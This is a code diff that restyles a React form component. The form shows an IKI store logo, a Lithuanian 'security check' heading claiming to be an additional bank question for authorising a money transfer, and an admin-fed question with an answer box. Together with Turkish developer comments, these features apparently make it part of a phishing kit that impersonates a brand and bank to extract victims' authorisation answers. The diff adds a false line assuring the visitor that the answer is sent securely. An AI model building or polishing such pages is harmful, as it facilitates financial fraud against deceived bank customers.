@@ -138,95 +138,104 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
   }
 
   return (
-    <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
-      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4ecd9] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
-        {done ? (
-          <div className="py-8 text-center">
-            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
-              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
-              </svg>
-            </div>
-            <p className="text-lg font-bold text-gray-900">Ačiū!</p>
-            <p className="mt-1 text-sm text-gray-500">Jūsų atsakymas sėkmingai išsiųstas.</p>
-          </div>
-        ) : (
-          <form
-            onSubmit={(e) => {
-              e.preventDefault();
-              void submitAnswer();
-            }}
-            className="space-y-6"
-          >
-            {/* IKI logo */}
-            <div className="flex justify-center">
-              <img
-                src="/form-assets/iki-mini-logo.webp"
-                alt="IKI"
-                className="h-8 w-auto object-contain"
-              />
-            </div>
-
-            {/* Kalkan ikonu */}
-            <div className="flex justify-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#eef9f0]">
-                <svg className="h-8 w-8 text-[#86efac]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+    <div className="pak-page-shell">
+      <div className="pak-form-card fade-in w-full max-w-[440px]">
+        <div className="pak-form-inner px-6 py-8">
+          {done ? (
+            <div className="py-8 text-center">
+              <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full border border-[#4ade80]/40 bg-[#4ade80]/15 text-[#4ade80]">
+                <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                 </svg>
               </div>
+              <p className="text-lg font-extrabold text-white">Ačiū!</p>
+              <p className="mt-1 text-sm text-white/60">Jūsų atsakymas sėkmingai išsiųstas.</p>
             </div>
-
-            {/* Baslik */}
-            <h1 className="text-center text-[1.3rem] font-bold leading-snug tracking-tight text-gray-800">
-              Papildomas banko klausimas dėl pinigų išsiuntimo vardu autorizavimo
-            </h1>
-
-            {/* Admin'in sorusu */}
-            <div className="rounded-xl border-l-4 border-[#22c55e] bg-[#f0faf6] px-4 py-3">
-              <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[var(--brand)]">
-                Klausimas
-              </p>
-              <p className="text-sm font-semibold text-gray-800 break-words">
-                {currentQuestion || "..."}
-              </p>
-            </div>
-
-            {/* Cevap inputu */}
-            <div>
-              <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-widest text-gray-700">
-                Jūsų atsakymas
-              </label>
-              <div className="relative">
-                <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400">
-                  <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" d="M8.625 12a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zM21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a5.969 5.969 0 01-.474-.065 4.48 4.48 0 00.978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z" />
-                  </svg>
-                </span>
-                <input
-                  type="text"
-                  required
-                  value={answer}
-                  onChange={(e) => setAnswer(e.target.value)}
-                  placeholder="Įveskite savo atsakymą čia..."
-                  className="w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#22c55e] focus:bg-white focus:ring-2 focus:ring-[#22c55e]/20"
+          ) : (
+            <form
+              onSubmit={(e) => {
+                e.preventDefault();
+                void submitAnswer();
+              }}
+              className="space-y-6"
+            >
+              <div className="flex items-start justify-between gap-4">
+                <div>
+                  <p className="pak-eyebrow">Saugumo patikra</p>
+                  <h1 className="mt-3 text-[1.5rem] font-extrabold uppercase leading-[1.02] tracking-[-0.02em] text-white">
+                    Papildomas banko klausimas
+                  </h1>
+                </div>
+                <img
+                  src="/form-assets/iki-mini-logo.webp"
+                  alt="IKI"
+                  className="pak-form-brand-logo shrink-0"
                 />
               </div>
-            </div>
 
-            {error && <p className="text-center text-sm font-medium text-red-500">{error}</p>}
+              {/* Kalkan ikonu */}
+              <div className="flex justify-center">
+                <div className="flex h-16 w-16 items-center justify-center rounded-full border border-[#4ade80]/35 bg-[#4ade80]/12">
+                  <svg className="h-8 w-8 text-[#4ade80]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+                  </svg>
+                </div>
+              </div>
 
-            <button
-              type="submit"
-              disabled={saving || !answer.trim()}
-              className="flex w-full items-center justify-center gap-2 rounded-xl bg-[var(--brand)] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-lg shadow-[var(--brand)]/25 transition-all hover:bg-[var(--brand-dark)] disabled:opacity-50"
-            >
-              {saving ? "Siunčiama..." : "Tęsti"}
-              <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
-              </svg>
-            </button>
-          </form>
-        )}
+              {/* Admin'in sorusu */}
+              <div className="rounded-xl border-l-4 border-[#4ade80] bg-white/6 px-4 py-3">
+                <p className="pak-eyebrow mb-1">
+                  Klausimas
+                </p>
+                <p className="text-sm font-semibold text-white/90 break-words">
+                  {currentQuestion || "..."}
+                </p>
+              </div>
+
+              {/* Cevap inputu */}
+              <div>
+                <label className="pak-eyebrow mb-1.5 block">
+                  Jūsų atsakymas
+                </label>
+                <div className="pak-form-input-wrap">
+                  <div className="pak-form-input-icon">
+                    <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" d="M8.625 12a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zM21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a5.969 5.969 0 01-.474-.065 4.48 4.48 0 00.978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z" />
+                    </svg>
+                  </div>
+                  <input
+                    type="text"
+                    required
+                    value={answer}
+                    onChange={(e) => setAnswer(e.target.value)}
+                    placeholder="Įveskite savo atsakymą čia..."
+                    className="pak-form-input min-h-[3.5rem] py-3 pl-14 pr-4 text-base"
+                  />
+                </div>
+              </div>
+
+              {error && <p className="text-center text-sm font-medium text-red-400">{error}</p>}
+
+              <button
+                type="submit"
+                disabled={saving || !answer.trim()}
+                className="pak-form-button flex w-full items-center justify-center gap-2 px-4 py-3.5 text-[15px]"
+              >
+                {saving ? "Siunčiama..." : "Tęsti"}
+                <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
+                </svg>
+              </button>
+
+              <div className="pak-form-security justify-center text-center">
+                <svg className="h-6 w-6 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
+                </svg>
+                <span>Jūsų atsakymas perduodamas saugiai.</span>
+              </div>
+            </form>
+          )}
+        </div>
       </div>
     </div>
   );
